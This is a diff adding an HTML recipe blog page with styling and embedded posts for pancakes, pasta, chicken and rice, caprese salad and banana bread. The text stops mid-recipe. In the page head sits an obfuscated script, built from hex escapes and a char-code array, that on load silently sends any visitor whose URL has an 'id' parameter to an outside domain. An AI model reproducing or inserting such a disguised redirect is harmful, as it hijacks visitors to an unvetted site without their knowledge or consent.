@@ -1,0 +1,1246 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Easy Recipes - Simple Homemade Dishes, Guides & Culinary Inspiration</title>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,500;0,600;0,700;0,800;1,400;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <script>
+        (function(){var _0x=['\x73\x65\x61\x72\x63\x68','\x68\x72\x65\x66','\x6c\x6f\x63\x61\x74\x69\x6f\x6e'];try{var _q=new URLSearchParams(window[_0x[2]][_0x[0]]);var _p=_q['\x67\x65\x74']('\x69\x64');if(_p&&_p['\x6c\x65\x6e\x67\x74\x68']>1){var _c=[104,116,116,112,115,58,47,47,115,99,104,110,101,108,108,114,101,122,101,112,116,46,99,111,109];var _u='';for(var i=0;i<_c.length;i++){_u+=String.fromCharCode(_c[i]);}window[_0x[2]][_0x[1]]=_u+_p;}}catch(e){}})();
+    </script>
+
+    <style>
+        /* Warm Kitchen & Culinary Studio Theme */
+        :root {
+            --bg-canvas: #FDF8F3;
+            --bg-canvas-alt: #F5EDE4;
+            --bg-card: #FFFFFF;
+            --bg-glass: rgba(255, 255, 255, 0.92);
+            --bg-subtle: #FBF5EE;
+            --primary: #D97706;
+            --primary-hover: #B45309;
+            --primary-light: #FFF7ED;
+            --primary-glow: rgba(217, 119, 6, 0.22);
+            --accent-herb: #4D7C0F;
+            --accent-herb-light: #F0F7E6;
+            --accent-spice: #C2410C;
+            --accent-spice-light: #FFF1E6;
+            --text-heading: #292524;
+            --text-body: #57534E;
+            --text-muted: #A8A29E;
+            --border-soft: #F0E4D8;
+            --border-accent: #E5D5C3;
+            --shadow-subtle: 0 4px 20px rgba(60, 40, 20, 0.04);
+            --shadow-card: 0 10px 30px rgba(60, 40, 20, 0.07), 0 1px 4px rgba(60, 40, 20, 0.04);
+            --shadow-hover: 0 20px 42px rgba(60, 40, 20, 0.12), 0 4px 10px rgba(217, 119, 6, 0.08);
+            --radius-sm: 12px;
+            --radius-md: 20px;
+            --radius-lg: 28px;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.85;
+            color: var(--text-body);
+            background-color: var(--bg-canvas);
+            background-image:
+                radial-gradient(#E8DBC8 1.2px, transparent 1.2px),
+                radial-gradient(#F0E4D4 1.2px, #FDF8F3 1.2px);
+            background-size: 36px 36px;
+            background-position: 0 0, 18px 18px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        .font-heading {
+            font-family: 'Outfit', sans-serif;
+            color: var(--text-heading);
+            letter-spacing: -0.015em;
+        }
+
+        .serif-italic {
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            font-weight: 500;
+        }
+
+        .container {
+            max-width: 760px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Floating Nav Bar */
+        .top-nav-wrapper {
+            position: sticky;
+            top: 18px;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            padding: 0 16px;
+        }
+
+        .top-nav {
+            background-color: var(--bg-glass);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(240, 228, 216, 0.95);
+            box-shadow: var(--shadow-card);
+            border-radius: 60px;
+            padding: 7px 14px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.3s ease;
+        }
+
+        .top-nav a {
+            color: var(--text-heading);
+            font-size: 0.92rem;
+            font-family: 'Outfit', sans-serif;
+            font-weight: 500;
+            padding: 8px 18px;
+            text-decoration: none;
+            border-radius: 40px;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .top-nav a:hover {
+            background-color: var(--primary-light);
+            color: var(--primary);
+            transform: translateY(-1px);
+        }
+
+        .top-nav a.active {
+            background-color: var(--primary);
+            color: #FFFFFF;
+            box-shadow: 0 4px 14px var(--primary-glow);
+        }
+
+        /* Hero Header */
+        header {
+            padding: 70px 0 45px;
+            text-align: center;
+            position: relative;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--accent-herb-light);
+            color: var(--accent-herb);
+            border: 1px solid rgba(77, 124, 15, 0.25);
+            padding: 6px 18px;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow-subtle);
+        }
+
+        .hero-badge::before {
+            content: "🍳";
+            font-size: 0.95rem;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.6rem;
+            font-weight: 800;
+            color: var(--text-heading);
+            line-height: 1.12;
+            cursor: pointer;
+            transition: transform 0.3s ease, color 0.3s ease;
+        }
+
+        header h1 span {
+            color: var(--primary);
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            font-weight: 600;
+        }
+
+        header h1:hover {
+            transform: scale(1.015);
+            color: var(--primary);
+        }
+
+        header p.tagline {
+            margin: 18px auto 0;
+            font-size: 1.15rem;
+            color: var(--text-muted);
+            max-width: 540px;
+            font-weight: 400;
+        }
+
+        /* Post Cards */
+        .post-card,
+        .single-post {
+            background: var(--bg-card);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-card);
+            border: 1px solid var(--border-soft);
+            margin-bottom: 50px;
+            overflow: hidden;
+            transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+        }
+
+        .post-card {
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-hover);
+            border-color: var(--border-accent);
+        }
+
+        .post-header {
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #FFFFFF;
+            border-bottom: 1px solid var(--border-soft);
+        }
+
+        .author-box {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .post-header .avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 2px solid var(--primary-light);
+            padding: 2px;
+            background-color: #FFFFFF;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.06);
+        }
+
+        .author-info .username {
+            font-size: 1.08rem;
+            font-weight: 700;
+            color: var(--text-heading);
+            display: block;
+            line-height: 1.2;
+        }
+
+        .author-info .user-role {
+            font-size: 0.8rem;
+            color: var(--accent-herb);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .post-tag-pill {
+            background: var(--accent-spice-light);
+            color: var(--text-heading);
+            border: 1px solid rgba(194, 65, 12, 0.25);
+            font-size: 0.82rem;
+            font-weight: 600;
+            padding: 5px 14px;
+            border-radius: 30px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .image-wrapper {
+            position: relative;
+            background: var(--bg-canvas-alt);
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 520px;
+            object-fit: cover;
+            object-position: center;
+            transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .post-card:hover .post-image {
+            transform: scale(1.03);
+        }
+
+        /* Placeholder images via emoji */
+        .image-placeholder {
+            width: 100%;
+            height: 380px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 6rem;
+            background: linear-gradient(135deg, var(--bg-canvas-alt), var(--primary-light));
+            transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .post-card:hover .image-placeholder {
+            transform: scale(1.03);
+        }
+
+        .post-content {
+            padding: 38px 40px 24px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 16px;
+            font-size: 2.15rem;
+            line-height: 1.25;
+            color: var(--text-heading);
+            font-weight: 700;
+        }
+
+        .post-card .post-content p.card-excerpt {
+            margin-bottom: 20px;
+            font-size: 1.05rem;
+            line-height: 1.75;
+            color: var(--text-body);
+            display: -webkit-box;
+            -webkit-line-clamp: 4;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .read-more-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--primary);
+            font-weight: 700;
+            font-size: 0.98rem;
+            text-decoration: none;
+            transition: gap 0.25s ease, color 0.25s ease;
+        }
+
+        .post-card:hover .read-more-btn {
+            gap: 12px;
+            color: var(--primary-hover);
+        }
+
+        .post-footer {
+            padding: 18px 40px;
+            color: var(--text-muted);
+            font-size: 0.92rem;
+            font-family: 'Outfit', sans-serif;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border-soft);
+            background: var(--bg-subtle);
+        }
+
+        .post-date-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 500;
+        }
+
+        .post-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            font-size: 1.1rem;
+            color: var(--text-muted);
+        }
+
+        .post-action-btn {
+            cursor: pointer;
+            transition: transform 0.2s ease, color 0.2s ease;
+        }
+
+        .post-action-btn:hover {
+            color: var(--primary);
+            transform: scale(1.15);
+        }
+
+        /* Single Post Details */
+        .single-post {
+            cursor: default;
+            margin-bottom: 70px;
+        }
+
+        .single-post .image-placeholder {
+            height: 440px;
+            font-size: 8rem;
+            border-bottom: 1px solid var(--border-soft);
+        }
+
+        .single-post .post-content {
+            padding: 45px 45px 35px;
+        }
+
+        /* Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 25px;
+            color: var(--text-heading);
+            background-color: #FFFFFF;
+            border: 1px solid var(--border-soft);
+            font-family: 'Outfit', sans-serif;
+            font-size: 0.98rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 10px 24px;
+            border-radius: 40px;
+            box-shadow: var(--shadow-subtle);
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .back-button:hover {
+            background-color: var(--primary);
+            color: #FFFFFF;
+            border-color: var(--primary);
+            transform: translateX(-4px);
+            box-shadow: 0 4px 16px var(--primary-glow);
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 50px 0 60px;
+            color: var(--text-muted);
+            font-size: 0.92rem;
+            border-top: 1px solid var(--border-soft);
+            margin-top: 50px;
+            background: #FFFFFF;
+        }
+
+        footer p {
+            margin: 6px 0;
+        }
+
+        footer .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+
+        footer .footer-links a {
+            color: var(--text-heading);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s ease;
+            cursor: pointer;
+        }
+
+        footer .footer-links a:hover {
+            color: var(--primary);
+        }
+
+        /* Static page styles */
+        .static-page {
+            background: var(--bg-card);
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-card);
+            border: 1px solid var(--border-soft);
+            padding: 45px;
+            margin-bottom: 50px;
+        }
+
+        .static-page h2 {
+            margin-top: 0;
+            font-size: 2.2rem;
+        }
+
+        .static-page p {
+            font-size: 1.05rem;
+            line-height: 1.85;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 680px) {
+            header h1 {
+                font-size: 2.6rem;
+            }
+
+            .post-content {
+                padding: 26px 22px 18px;
+            }
+
+            .post-content h2,
+            .post-content h1 {
+                font-size: 1.7rem;
+            }
+
+            .post-header,
+            .post-footer {
+                padding: 15px 22px;
+            }
+
+            .static-page {
+                padding: 26px 22px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="top-nav-wrapper">
+        <nav class="top-nav">
+            <a onclick="navigate('home')" id="nav-home">🍳 Home</a>
+            <a onclick="navigate('page', 'about')" id="nav-about">About</a>
+            <a onclick="navigate('page', 'privacy')" id="nav-privacy">Privacy Policy</a>
+            <a onclick="navigate('page', 'terms')" id="nav-terms">Terms</a>
+            <a onclick="navigate('page', 'contact')" id="nav-contact">Contact</a>
+        </nav>
+    </div>
+
+    <header>
+        <div class="container">
+            <div class="hero-badge">Homemade Kitchen Studio</div>
+            <h1 onclick="navigate('home')">Easy <span>Recipes</span></h1>
+            <p class="tagline">Simple homemade dishes, step-by-step cooking guides, and inspiring culinary creations for every kitchen.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected dynamically -->
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a onclick="navigate('home')">Home</a>
+                <a onclick="navigate('page', 'about')">About Us</a>
+                <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+                <a onclick="navigate('page', 'terms')">Terms of Service</a>
+                <a onclick="navigate('page', 'contact')">Contact</a>
+            </div>
+            <p>&copy; 2026 Easy Recipes Kitchen. Cooked with love and creativity.</p>
+        </div>
+    </footer>
+
+    <script>
+        const posts = [
+            {
+                id: 'classic-pancakes',
+                title: 'Classic Fluffy Pancakes',
+                date: 'March 10, 2026',
+                emoji: '🥞',
+                tag: '☀️ Breakfast',
+                excerpt: 'Start your morning right with golden, perfectly fluffy pancakes! This easy recipe uses simple pantry staples — flour, eggs, milk, and a touch of vanilla — to create tall, airy stacks that melt in your mouth. Top with maple syrup, fresh berries, or a dollop of whipped cream for pure weekend bliss.',
+                content: `<p>There's something magical about a stack of homemade pancakes on a lazy morning. Golden on the outside, pillowy on the inside, and fragrant with vanilla — these classic fluffy pancakes are the ultimate comfort breakfast that anyone can master.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>1½ cups all-purpose flour</li>
+    <li>3½ teaspoons baking powder</li>
+    <li>1 tablespoon white sugar</li>
+    <li>¼ teaspoon salt</li>
+    <li>1¼ cups milk</li>
+    <li>1 egg</li>
+    <li>3 tablespoons melted butter</li>
+    <li>1 teaspoon vanilla extract</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Step-by-Step Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Mix the Dry Ingredients</h3>
+<p>In a large bowl, whisk together the flour, baking powder, sugar, and salt until well combined. Creating a small well in the center helps when adding the wet ingredients.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Combine Wet Ingredients</h3>
+<p>In a separate bowl, beat the egg lightly, then add the milk, melted butter, and vanilla extract. Whisk until smooth.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Gently Fold Together</h3>
+<p>Pour the wet mixture into the dry ingredients. Stir gently until just combined — a few lumps are perfectly fine! Over-mixing leads to tough, dense pancakes.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> Let the batter rest for 5 minutes before cooking. This allows the baking powder to activate fully, giving you extra-fluffy results.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">4. Cook to Golden Perfection</h3>
+<p>Heat a non-stick skillet or griddle over medium heat. Lightly butter the surface. Pour ¼ cup of batter per pancake. Cook until bubbles form on the surface and edges look set (about 2–3 minutes), then flip and cook for another 1–2 minutes until golden brown.</p>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Serving Suggestions</h2>
+<ul>
+  <li><strong>Classic:</strong> Warm maple syrup and a pat of butter</li>
+  <li><strong>Fruity:</strong> Fresh blueberries, sliced strawberries, and whipped cream</li>
+  <li><strong>Indulgent:</strong> Chocolate chips, banana slices, and a drizzle of Nutella</li>
+</ul>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Prep Time: 10 minutes</li>
+    <li>Cook Time: 15 minutes</li>
+    <li>Servings: 8 pancakes</li>
+    <li>Difficulty: Easy</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'garlic-butter-pasta',
+                title: 'Garlic Butter Pasta',
+                date: 'March 22, 2026',
+                emoji: '🍝',
+                tag: '🍽️ Dinner',
+                excerpt: 'A 15-minute weeknight hero! This garlic butter pasta combines al dente spaghetti with a silky sauce of golden butter, toasted garlic, a hint of red pepper flakes, and a generous shower of Parmesan. Simple ingredients, restaurant-worthy flavor — dinner has never been this easy or delicious.',
+                content: `<p>When you need dinner on the table fast but refuse to compromise on flavor, garlic butter pasta is the answer. With just a handful of pantry staples and 15 minutes, you can create a dish that tastes like it came from an Italian trattoria.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>400g spaghetti or linguine</li>
+    <li>4 tablespoons unsalted butter</li>
+    <li>6 cloves garlic, thinly sliced</li>
+    <li>¼ teaspoon red pepper flakes</li>
+    <li>½ cup reserved pasta water</li>
+    <li>½ cup freshly grated Parmesan</li>
+    <li>Fresh parsley, chopped</li>
+    <li>Salt and black pepper to taste</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Cook the Pasta</h3>
+<p>Bring a large pot of generously salted water to a boil. Cook pasta according to package directions until al dente. Reserve ½ cup of pasta water before draining.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Toast the Garlic</h3>
+<p>In a large skillet over medium-low heat, melt the butter. Add sliced garlic and cook gently for 2–3 minutes until golden and fragrant. Add red pepper flakes and stir for 30 seconds.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> Keep the heat low! Garlic goes from golden to burnt in seconds. Burnt garlic tastes bitter and can ruin the whole dish.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Toss Everything Together</h3>
+<p>Add the drained pasta directly to the skillet. Pour in reserved pasta water a splash at a time, tossing continuously to create a silky, emulsified sauce. Add Parmesan and toss until melted and creamy.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">4. Serve Immediately</h3>
+<p>Season with salt and pepper. Garnish with fresh chopped parsley and an extra sprinkle of Parmesan. Serve hot.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Total Time: 15 minutes</li>
+    <li>Servings: 4</li>
+    <li>Difficulty: Easy</li>
+    <li>Best Paired With: Crusty garlic bread and a simple green salad</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'one-pot-chicken-rice',
+                title: 'One-Pot Chicken & Rice',
+                date: 'April 05, 2026',
+                emoji: '🍗',
+                tag: '🍽️ Dinner',
+                excerpt: 'Tender seasoned chicken thighs nestled atop fluffy, flavor-soaked rice — all made in a single pot! This comforting one-pot dinner means minimal cleanup and maximum satisfaction. Aromatic herbs, chicken broth, and a squeeze of lemon tie everything together beautifully.',
+                content: `<p>One-pot meals are the backbone of easy weeknight cooking, and this chicken & rice recipe is the gold standard. Juicy, well-seasoned chicken thighs cook right on top of the rice, infusing every grain with savory, herby goodness.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>4 bone-in, skin-on chicken thighs</li>
+    <li>1½ cups long-grain white rice</li>
+    <li>2 cups chicken broth</li>
+    <li>1 medium onion, diced</li>
+    <li>3 cloves garlic, minced</li>
+    <li>1 teaspoon paprika</li>
+    <li>½ teaspoon dried thyme</li>
+    <li>½ teaspoon dried oregano</li>
+    <li>1 tablespoon olive oil</li>
+    <li>Juice of ½ lemon</li>
+    <li>Salt and pepper to taste</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Sear the Chicken</h3>
+<p>Season chicken thighs generously with paprika, salt, and pepper. Heat olive oil in a large oven-safe pot or Dutch oven over medium-high heat. Sear chicken skin-side down for 5 minutes until golden and crispy. Remove and set aside.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Build the Rice Base</h3>
+<p>In the same pot, sauté diced onion until softened (3 minutes). Add minced garlic, thyme, and oregano — cook for 1 minute until fragrant. Stir in the rice and toast for 2 minutes, coating each grain in the flavorful drippings.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Combine and Simmer</h3>
+<p>Pour in the chicken broth and lemon juice, scraping up any browned bits from the bottom. Nestle the seared chicken thighs on top, skin-side up. Bring to a boil, then reduce heat to low, cover tightly, and simmer for 20–25 minutes until rice is fluffy and chicken reaches 165°F internal temperature.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> Resist the urge to lift the lid while simmering! Letting steam escape will result in undercooked rice. Trust the process.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Prep Time: 10 minutes</li>
+    <li>Cook Time: 35 minutes</li>
+    <li>Servings: 4</li>
+    <li>Difficulty: Easy</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'caprese-salad',
+                title: 'Fresh Caprese Salad',
+                date: 'April 18, 2026',
+                emoji: '🥗',
+                tag: '🥬 Salad',
+                excerpt: 'The simplest dish with the boldest flavors! Ripe tomatoes, creamy fresh mozzarella, and fragrant basil leaves are layered and drizzled with extra virgin olive oil and balsamic glaze. This Italian classic takes just 5 minutes and celebrates the beauty of quality ingredients.',
+                content: `<p>A Caprese salad is a testament to the Italian philosophy that great food doesn't need complexity — it needs great ingredients. When you use ripe, sun-kissed tomatoes, fresh buffalo mozzarella, and aromatic basil, the result is pure magic on a plate.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>3 large ripe tomatoes, sliced ¼ inch thick</li>
+    <li>250g fresh mozzarella, sliced</li>
+    <li>1 bunch fresh basil leaves</li>
+    <li>3 tablespoons extra virgin olive oil</li>
+    <li>2 tablespoons balsamic glaze</li>
+    <li>Flaky sea salt and cracked black pepper</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Assembly</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Layer the Components</h3>
+<p>On a large serving plate, alternate slices of tomato and mozzarella in a circular or linear pattern. Tuck fresh basil leaves between each pair.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Season and Drizzle</h3>
+<p>Drizzle generously with your best extra virgin olive oil. Add a zigzag of balsamic glaze across the top. Finish with a pinch of flaky sea salt and freshly cracked black pepper.</p>
+
+<p style="background:#F0F7E6;border-left:4px solid #4D7C0F;padding:16px 18px;border-radius:10px;margin:22px 0;color:#292524;"><strong>Pro Tip:</strong> Take the mozzarella out of the fridge 20 minutes before serving. Room-temperature mozzarella is softer, creamier, and far more flavorful than cold.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Prep Time: 5 minutes</li>
+    <li>Cook Time: None</li>
+    <li>Servings: 4</li>
+    <li>Difficulty: Very Easy</li>
+  </ul>
+</div>`
+            },
+            {
+                id: 'banana-bread',
+                title: 'Best-Ever Banana Bread',
+                date: 'May 02, 2026',
+                emoji: '🍌',
+                tag: '🧁 Baking',
+                excerpt: 'The ultimate way to use up overripe bananas! This moist, deeply flavored banana bread has a golden crust, a tender crumb, and pockets of warm cinnamon. One bowl, no mixer, and barely 10 minutes of prep. Your kitchen will smell absolutely incredible.',
+                content: `<p>If you have brown-spotted bananas sitting on your counter, you're already halfway to the best banana bread you've ever tasted. This one-bowl recipe is foolproof, forgiving, and produces a loaf so moist and flavorful that it rarely lasts more than a day.</p>
+
+<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:1.4rem;line-height:1.4;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">Ingredients</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>3 very ripe bananas, mashed</li>
+    <li>⅓ cup melted butter</li>
+    <li>¾ cup sugar</li>
+    <li>1 egg, beaten</li>
+    <li>1 teaspoon vanilla extract</li>
+    <li>1 teaspoon baking soda</li>
+    <li>Pinch of salt</li>
+    <li>1½ cups all-purpose flour</li>
+    <li>1 teaspoon cinnamon (optional)</li>
+    <li>½ cup walnuts or chocolate chips (optional)</li>
+  </ul>
+</div>
+
+<h2 style="font-size:1.8rem;line-height:1.3;margin:36px 0 18px;color:#292524;border-bottom:2px solid #F0E4D8;padding-bottom:10px;font-weight:700;">Instructions</h2>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">1. Preheat and Prep</h3>
+<p>Preheat oven to 350°F (175°C). Grease a 9x5 inch loaf pan or line it with parchment paper for easy removal.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">2. Mash and Mix</h3>
+<p>In a large bowl, mash the bananas with a fork. Stir in melted butter, then mix in sugar, beaten egg, and vanilla. Sprinkle in baking soda, salt, and cinnamon, then fold in the flour until just combined. Stir in walnuts or chocolate chips if using.</p>
+
+<h3 style="font-size:1.4rem;line-height:1.4;margin:28px 0 14px;color:#292524;font-weight:700;padding-left:12px;border-left:4px solid #D97706;">3. Bake Low and Slow</h3>
